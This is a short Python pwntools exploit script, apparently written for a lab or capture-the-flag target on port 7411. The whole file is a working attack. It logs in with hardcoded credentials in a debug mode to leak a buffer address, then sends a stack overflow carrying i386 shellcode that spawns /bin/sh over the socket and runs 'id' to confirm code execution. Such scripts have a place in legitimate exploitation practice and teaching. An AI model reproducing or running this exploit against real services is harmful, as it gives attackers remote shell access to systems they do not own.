#!/usr/bin/env python3
"""diag4.py - real shellcode, explicit send/recv, no interactive."""
import sys
import time
from pwn import *  # noqa: F403

context.update(arch="i386", os="linux", log_level="error")
HOST = sys.argv[1] if len(sys.argv) > 1 else "10.129.63.36"

# 1. Leak
conn = remote(HOST, 7411, timeout=10)
conn.recvuntil(b"Send USER command.")
conn.sendline(b"DEBUG")
conn.recvuntil(b"DEBUG mode on.")
conn.sendline(b"USER admin")
conn.recvuntil(b"Send PASS command.")
conn.sendline(b"PASS 1974jailbreak!")
conn.recvuntil(b"userpass buffer @ ")
raw = conn.recvline().strip()
base = int(raw, 16)
conn.close()
print(f"[+] leak: 0x{base:08x}")

# 2. Exploit
SHELL_BYTES = bytes.fromhex(
    "6a3f586a015b31c9cd806a0b589952682f2f7368682f62696e89e331c9cd80"
)
payload = b"A" * 28 + p32(base + 32) + SHELL_BYTES

c = remote(HOST, 7411, timeout=10)
c.recvuntil(b"Send USER command.")
c.sendline(b"USER admin")
c.recvuntil(b"Send PASS command.")
c.sendline(b"PASS " + payload)

# drain whatever the server sends
time.sleep(2.5)
try:
    d = c.recv(timeout=2)
    print(f"drain: {d!r}")
except Exception as e:
    print("drain err:", e)

print("[+] sending 'id'")
c.send(b"id; echo MARKER_DONE\n")
time.sleep(1)
try:
    d = c.recv(timeout=5)
    print(f"after id: {d!r}")
except Exception as e:
    print("recv err:", e)

c.close()
